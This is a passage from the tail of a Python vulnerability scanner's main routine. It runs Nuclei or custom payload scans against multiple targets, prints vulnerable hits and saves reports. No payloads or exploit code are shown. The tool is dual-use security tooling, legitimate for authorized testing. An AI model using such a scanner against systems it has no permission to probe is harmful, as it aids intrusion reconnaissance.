            print_status(f"Using Nuclei scanner for {len(targets)} target(s)", "info")
            if args.nuclei_template:
                print_status(f"Using custom template: {args.nuclei_template}", "info")
            print()
            
            # Parse headers for Nuclei
            nuclei_headers = parse_headers(args.headers) if args.headers else None
            
            def progress_callback(result: NucleiResult):
                print_status(
                    f"{Colors.RED}VULNERABLE{Colors.RESET}: {result.target}",
                    "vuln",
                    args.quiet
                )
                if not args.quiet:
                    print(f"    ‚îú‚îÄ Matched: {result.matched_at}")
                    print(f"    ‚îú‚îÄ Severity: {result.severity.upper()}")
                    if result.extracted_results:
                        print(f"    ‚îî‚îÄ Extracted: {', '.join(result.extracted_results[:3])}")
            
            nuclei_results = run_nuclei_scan(
                targets=targets,
                template_path=args.nuclei_template,
                timeout=args.timeout,
                rate_limit=args.nuclei_rate_limit,
                concurrency=args.nuclei_concurrency,
                proxy=args.proxy,
                headers=nuclei_headers,
                verbose=args.verbose,
                progress_callback=progress_callback if not args.quiet else None,
            )
            
            # Convert to standard result format for reporting
            results = []
            for nr in nuclei_results:
                result_dict = convert_nuclei_to_scan_result(nr)
                # Create a ScanResult-like object for compatibility
                sr = ScanResult(
                    target=result_dict["target"],
                    vulnerable=True,
                    payload=result_dict["payload"],
                    status_code=200,
                    response_length=None,
                    response_snippet=result_dict["response_snippet"],
                    response_time=None,
                    server_header=None,
                    waf_detected=None,
                )
                results.append(sr)
            
            # Add non-vulnerable targets
            vulnerable_targets = {r.target for r in results}
            for target in targets:
                if not target.startswith(('http://', 'https://')):
                    target = f"http://{target}"
                if target not in vulnerable_targets:
                    results.append(ScanResult(target=target, vulnerable=False))
            
            # Print summary
            print()
            print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}NUCLEI SCAN SUMMARY{Colors.RESET}")
            print(f"{'='*60}")
            print(f"  Total Targets:  {len(targets)}")
            print(f"  {Colors.RED}Vulnerable:     {len(nuclei_results)}{Colors.RESET}")
            print(f"  {Colors.GREEN}Not Vulnerable: {len(targets) - len(nuclei_results)}{Colors.RESET}")
            print(f"{'='*60}")
            
            if nuclei_results:
                print(f"\n{Colors.RED}{Colors.BOLD}Vulnerable Targets:{Colors.RESET}")
                for nr in nuclei_results:
                    print(f"  ‚Ä¢ {nr.target}")
                    print(f"    Matched: {nr.matched_at}")
            
            # Save results if output file specified
            if args.output and results:
                save_results(results, args.output, args.format)
            
            vulnerable_count = len(nuclei_results)
            sys.exit(0 if vulnerable_count == 0 else 1)
            
        except ImportError as e:
            print_status(f"Nuclei integration module not found: {e}", "error")
            sys.exit(1)
        except Exception as e:
            print_status(f"Nuclei scan error: {e}", "error")
            sys.exit(1)
    
    # Build configuration
    config = ScanConfig(
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify,
        user_agent=args.user_agent,
        all_payloads=args.all_payloads,
        verbose=args.verbose,
        proxy=args.proxy,
        cookies=parse_cookies(args.cookie) if args.cookie else {},
        headers=parse_headers(args.headers) if args.headers else {},
        rate_limit=args.rate_limit,
        retries=args.retries,
        follow_redirects=args.follow_redirects,
        method=args.method,
        match_regex=args.match_regex,
        exclude_regex=args.exclude_regex,
    )
    
    # Run scan
    results = scan_multiple_targets(
        targets=targets,
        config=config,
        threads=args.threads,
        custom_payloads=custom_payloads,
        quiet=args.quiet,
        resume_file=args.resume_file if args.resume else None,
    )
    
    # Print summary
    print_summary(results, args.quiet)
    
    # Save results if output file specified
    if args.output and results:
        save_results(results, args.output, args.format)
    
    # Clean up resume state on successful completion
    if args.resume and os.path.exists(args.resume_file):
        os.remove(args.resume_file)
        print_status("Scan completed, resume state cleared", "info")
    
    # Exit with appropriate code
    vulnerable_count = sum(1 for r in results if r.vulnerable)
    sys.exit(0 if vulnerable_count == 0 else 1)


if __name__ == "__main__":
    main()
